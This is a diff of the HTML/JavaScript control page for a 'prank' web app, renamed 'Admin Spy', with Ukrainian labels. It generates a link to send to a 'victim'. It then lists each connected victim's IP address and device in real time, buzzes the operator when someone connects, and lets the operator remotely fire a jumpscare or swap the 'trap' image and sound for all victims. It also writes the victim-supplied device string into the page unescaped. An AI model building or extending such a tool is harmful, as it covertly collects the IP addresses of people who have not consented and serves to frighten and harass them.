@@ -3,32 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Base</title>
+    <title>Admin Spy</title>
     <style>
         body { background-color: #0d0d0d; color: #00ff99; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
         .container { max-width: 500px; margin: 0 auto; background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #333; }
-        input { width: 90%; padding: 12px; margin: 5px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; }
+        input { width: 90%; padding: 12px; margin: 5px 0; background: #222; border: 1px solid #444; color: white; }
         button { width: 100%; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
         
         .btn-create { background: #00ff99; color: black; }
-        .btn-scare { background: #ff0055; color: white; height: 100px; font-size: 28px; display: none; margin-top: 20px; box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); }
-        .btn-scare:active { transform: scale(0.98); }
+        .btn-scare { background: #ff0055; color: white; height: 100px; font-size: 28px; display: none; margin-top: 20px; box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); animation: pulse 1s infinite; }
         
-        /* Стилі для історії */
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+        
+        #live-users-panel { display: none; margin-top: 20px; text-align: left; background: #111; padding: 10px; border: 1px solid #333; }
+        .user-row { background: #222; padding: 10px; margin-bottom: 5px; border-left: 3px solid #00ff99; display: flex; justify-content: space-between; align-items: center; font-size: 13px;}
+        .user-online { color: #00ff99; font-weight: bold; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        
         #history-panel { margin-top: 30px; text-align: left; }
-        .history-item { background: #222; padding: 10px; margin-bottom: 8px; border-radius: 5px; border-left: 3px solid #555; cursor: pointer; transition: 0.2s; font-size: 12px; display: flex; justify-content: space-between; align-items: center;}
-        .history-item:hover { background: #333; }
-        .active-room { border-left: 3px solid #00ff99; box-shadow: 0 0 10px rgba(0, 255, 153, 0.1); }
-        .status-dot { height: 10px; width: 10px; background-color: #555; border-radius: 50%; display: inline-block; margin-right: 5px;}
-        .online { background-color: #00ff99; box-shadow: 0 0 5px #00ff99; }
-
-        /* Лог жертви */
-        #victim-log { display: none; margin-top: 15px; padding: 10px; background: #2a2a00; border: 1px solid #ffff00; color: #ffff00; font-size: 12px; text-align: left; }
+        .history-item { background: #222; padding: 10px; margin-bottom: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; border-left: 3px solid #555; }
+        .active-room { border-left: 3px solid #ff0055; background: #2a1a1a; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>👁️ CONTROL CENTER</h1>
+        <h1>👁️ SPY CONTROL</h1>
         
         <div id="setup-step">
             <input type="text" id="imgUrl" placeholder="Картинка (URL)">
@@ -37,18 +37,31 @@
         </div>
 
         <div id="control-panel" style="display: none;">
-            <div style="background: #333; padding: 10px; border-radius: 5px; word-break: break-all;">
-                <span style="color: #aaa; font-size: 12px;">Посилання для жертви:</span><br>
-                <a id="victim-link" href="#" target="_blank" style="color: #4db8ff; font-size: 14px;">...</a>
+            <div style="background: #333; padding: 10px; font-size: 12px; word-break: break-all;">
+                <a id="victim-link" href="#" target="_blank" style="color: #4db8ff;">...</a>
             </div>
             
-            <div id="victim-log"></div>
+            <!-- НОВА ПАНЕЛЬ ЗМІНИ МЕДІА -->
+            <div style="margin-top: 20px; padding: 15px; background: #222; border-radius: 8px;">
+                <h3 style="margin: 0 0 10px 0; font-size: 14px; color: #00ff99;">ЗМІНИТИ ПАСТКУ</h3>
+                <input type="text" id="newImgUrl" placeholder="Нова картинка (URL)" style="width: 100%; margin-bottom: 8px;">
+                <input type="text" id="newSndUrl" placeholder="Новий звук (URL .mp3)" style="width: 100%; margin-bottom: 8px;">
+                <button onclick="updateMedia()" style="width: 100%; padding: 12px; background: #00ccff; color: black; font-weight: bold;">
+                    ОНОВИТИ ДЛЯ ВСІХ
+                </button>
+            </div>
+
+            <div id="live-users-panel">
+                <div style="font-size: 10px; color: #777; margin-bottom: 5px;">LIVE CONNECTIONS:</div>
+                <div id="users-list">Checking...</div>
+            </div>
+
             <button id="scare-btn" class="btn-scare" onclick="trigger()">НАЛЯКАТИ 💀</button>
-            <button onclick="location.reload()" style="background: #333; color: #888; margin-top: 20px; font-size: 12px; padding: 10px;">⬅ Назад до меню</button>
+            <button onclick="location.reload()" style="background: #333; color: #888; margin-top: 20px; padding: 10px;">⬅ Меню</button>
         </div>
 
         <div id="history-panel">
-            <h3 style="color: #666; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px;">ІСТОРІЯ КІМНАТ</h3>
+            <h3 style="color: #666; font-size: 14px;">ІСТОРІЯ</h3>
             <div id="history-list"></div>
         </div>
     </div>
@@ -58,7 +71,6 @@
         const socket = io();
         let currentSessionId = null;
 
-        // 1. При завантаженні - малюємо історію
         window.onload = loadHistory;
 
         async function createLink() {
@@ -72,110 +84,127 @@
             });
             const data = await res.json();
             
-            saveToHistory(data.id, data.createdAt); // Зберігаємо в телефон
-            activateRoom(data.id); // Вмикаємо пульт
-            loadHistory(); // Оновлюємо список
+            saveToHistory(data.id, data.createdAt);
+            activateRoom(data.id);
+            loadHistory();
         }
 
-        // Вхід у вже створену кімнату
+        async function updateMedia() {
+            if (!currentSessionId) return;
+
+            const newImage = document.getElementById('newImgUrl').value.trim();
+            const newSound = document.getElementById('newSndUrl').value.trim();
+
+            if (!newImage && !newSound) {
+                alert('Введіть хоча б одне нове значення');
+                return;
+            }
+
+            const res = await fetch(`/update-session/${currentSessionId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: newImage || undefined, 
+                    sound: newSound || undefined 
+                })
+            });
+
+            if (res.ok) {
+                alert('Пастку успішно оновлено! Всі жертви побачать зміни.');
+                document.getElementById('newImgUrl').value = '';
+                document.getElementById('newSndUrl').value = '';
+            } else {
+                alert('Помилка оновлення');
+            }
+        }
+
         function activateRoom(id) {
             currentSessionId = id;
-            
-            // Налаштування UI
             document.getElementById('setup-step').style.display = 'none';
-            document.getElementById('history-panel').style.display = 'none'; // Ховаємо історію, щоб не заважала
+            document.getElementById('history-panel').style.display = 'none';
             document.getElementById('control-panel').style.display = 'block';
-            document.getElementById('scare-btn').style.display = 'block';
             
             const link = `${window.location.origin}/victim.html?id=${id}`;
             document.getElementById('victim-link').href = link;
             document.getElementById('victim-link').innerText = link;
-            document.getElementById('victim-log').style.display = 'none';
-
-            // Підключаємо сокети
-            socket.emit('join-room', id);
+            
+            socket.emit('join-room-admin', id);
         }
 
-        // Кнопка "Налякати"
         function trigger() {
             if(currentSessionId) socket.emit('trigger-scare', currentSessionId);
         }
 
-        // --- ЛОГІКА ІСТОРІЇ (LocalStorage) ---
-        function getSavedIds() {
-            const saved = localStorage.getItem('prank_rooms');
-            return saved ? JSON.parse(saved) : [];
-        }
+        // Список жертв
+        socket.on('update-victim-list', (users) => {
+            const listDiv = document.getElementById('users-list');
+            const panel = document.getElementById('live-users-panel');
+            const scareBtn = document.getElementById('scare-btn');
+            
+            panel.style.display = 'block';
+            if (users.length === 0) {
+                listDiv.innerHTML = '<div style="color: #555; font-style: italic;">Очікування жертви...</div>';
+                scareBtn.style.display = 'none';
+            } else {
+                scareBtn.style.display = 'block';
+                listDiv.innerHTML = '';
+                
+                users.forEach(u => {
+                    const row = document.createElement('div');
+                    row.className = 'user-row';
+                    const shortIp = u.ip.split(',')[0];
+                    
+                    row.innerHTML = `
+                        <div>
+                            <span style="font-size:14px;">${u.device}</span><br>
+                            <span style="color:#666; font-size:10px;">IP: ${shortIp}</span>
+                        </div>
+                        <div class="user-online">● ONLINE</div>
+                    `;
+                    listDiv.appendChild(row);
+                });
+            }
+        });
 
+        socket.on('admin-alert', () => {
+            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+        });
+
+        // Історія
+        function getSavedIds() { return JSON.parse(localStorage.getItem('prank_rooms') || '[]'); }
         function saveToHistory(id, date) {
             const list = getSavedIds();
-            // Додаємо нову на початок
             list.unshift({ id, date });
-            // Тримаємо тільки останні 10
-            if(list.length > 10) list.pop();
+            if(list.length > 15) list.pop();
             localStorage.setItem('prank_rooms', JSON.stringify(list));
         }
 
         async function loadHistory() {
             const list = getSavedIds();
-            if(list.length === 0) {
-                document.getElementById('history-list').innerHTML = '<span style="color:#444; font-size: 12px;">Пусто...</span>';
-                return;
-            }
-
-            // Запитуємо у сервера, хто онлайн
-            const idsOnly = list.map(item => item.id);
+            if(list.length === 0) return;
+            const idsOnly = list.map(i => i.id);
             const res = await fetch('/check-status', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ ids: idsOnly })
             });
-            const statuses = await res.json(); // Приходить відсортований масив
-
+            const statuses = await res.json();
             const container = document.getElementById('history-list');
             container.innerHTML = '';
-
             statuses.forEach(room => {
-                // Знаходимо дату створення
-                const localItem = list.find(l => l.id === room.id);
-                const dateStr = localItem ? localItem.date : 'Unknown';
-                const isActive = room.active;
-
+                const isActive = room.count > 0;
                 const div = document.createElement('div');
                 div.className = `history-item ${isActive ? 'active-room' : ''}`;
                 div.onclick = () => activateRoom(room.id);
                 div.innerHTML = `
-                    <div>
-                        <span class="status-dot ${isActive ? 'online' : ''}"></span>
-                        <span style="color: white; font-weight: bold;">Кімната...${room.id.slice(0, 4)}</span>
-                        <br>
-                        <span style="color: #777;">🕒 ${dateStr}</span>
+                    <div style="display:flex; justify-content:space-between;">
+                        <span>ROOM ...${room.id.slice(0, 4)}</span>
+                        ${isActive ? `<span class="blink" style="color:#ff0055;">👁️ ${room.count} ONLINE</span>` : '<span style="color:#555;">Offline</span>'}
                     </div>
-                    ${isActive ? '<span style="color: #00ff99;">ОНЛАЙН 🔥</span>' : '<span style="color: #555;">Пусто</span>'}
                 `;
                 container.appendChild(div);
             });
         }
-
-        // --- СПОВІЩЕННЯ ПРО ЖЕРТВУ ---
-        socket.on('admin-alert', (data) => {
-            const log = document.getElementById('victim-log');
-            log.style.display = 'block';
-            
-            // Простий парсинг пристрою
-            let device = "PC";
-            if(data.device.includes('Android')) device = "Android";
-            if(data.device.includes('iPhone')) device = "iPhone";
-
-            log.innerHTML = `
-                <strong>${data.msg}</strong><br>
-                📱 ${device}<br>
-                🌐 IP: ${data.ip}<br>
-                🕒 ${data.time}
-            `;
-            // Вібрація адміна, щоб знав, що пора тиснути
-            if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
-        });
     </script>
 </body>
 </html>
